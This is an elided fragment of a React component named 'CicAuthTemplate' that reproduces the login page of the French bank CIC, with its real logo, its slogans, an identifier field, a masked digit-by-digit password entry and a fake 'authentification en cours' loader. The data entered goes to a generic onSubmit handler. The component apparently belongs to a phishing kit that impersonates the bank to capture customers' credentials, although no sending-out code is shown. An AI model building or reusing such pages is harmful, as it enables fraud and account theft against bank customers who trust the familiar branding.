...
export function CicAuthTemplate({ onSubmit }: CicAuthTemplateProps) {
  ...
  if (showLoader) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-900 to-blue-950 pt-20">
        <div className="max-w-4xl mx-auto px-4 py-8">
          <div className="bg-white rounded-2xl shadow-xl p-8">
            <div className="flex flex-col items-center justify-center py-16">
              <Loader2 className="w-12 h-12 animate-spin text-blue-900 mb-6" />
              <h2 className="text-2xl font-bold text-gray-800 mb-4">
                Authentification en cours...
              </h2>
              <p className="text-gray-600 text-center max-w-md">
                Connexion sécurisée à votre espace CIC en cours.
              </p>
            </div>
          </div>
        </div>
  ...
  return (
    <div className="min-h-screen bg-white">
      <div className="grid grid-cols-1 lg:grid-cols-2 min-h-screen">
          ...
          <div className="max-w-md mx-auto w-full">
            ...
            <div className="flex items-center justify-between mb-8">
              <div className="flex items-center">
                <img 
                  src="https://upload.wikimedia.org/wikipedia/fr/thumb/8/8c/Logo_CIC_2020.svg/1200px-Logo_CIC_2020.svg.png" 
                  alt="CIC" 
                  className="h-8"
                />
              </div>
            ...
            <form onSubmit={handleSubmit} className="space-y-6">
              ...
              <div>
                ...
                <input
                  ...
                  className="w-full px-4 py-3 border border-gray-300 rounded focus:ring-2 focus:ring-blue-900 focus:border-transparent text-lg"
                ...
                <label className="flex items-center space-x-2 cursor-pointer">
                  <div className="relative">
                    ...
                    <div className={`w-12 h-6 rounded-full transition-colors ${
                      rememberMe ? 'bg-blue-900' : 'bg-gray-300'
                    }`}>
                  ...
                  {passwordDigits.map((digit, index) => (
                    <div
                      ...
                      className={`w-8 h-8 border-2 rounded flex items-center justify-center text-lg font-bold ${
                        digit ? 'border-blue-900 bg-blue-50' : 'border-gray-300'
                      }`}
                    >
                      {digit ? '•' : ''}
                    </div>
              ...
              <button
                ...
                className="w-full bg-blue-900 text-white font-semibold py-4 rounded hover:bg-blue-950 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
              >
        ...
        {/* Right Panel - Dark Blue Background with Content */}
        <div className="bg-gradient-to-br from-blue-900 to-blue-950 p-4 lg:p-8 flex flex-col justify-center text-white">
          <div className="max-w-md mx-auto w-full">
            <h2 className="text-3xl lg:text-4xl font-bold mb-8">
              CIC, banque du groupe Crédit Mutuel
            </h2>

            {/* Insurance Section */}
            <div className="bg-blue-950 bg-opacity-50 rounded-lg p-6 mb-8">
              ...
              <div className="space-y-3">
                ...
                <br />
                <button className="bg-blue-800 hover:bg-blue-700 text-white px-6 py-2 rounded transition-colors">
            ...
            <div className="text-blue-100 text-sm space-y-2">
              <p>• Banque de proximité depuis 1859</p>
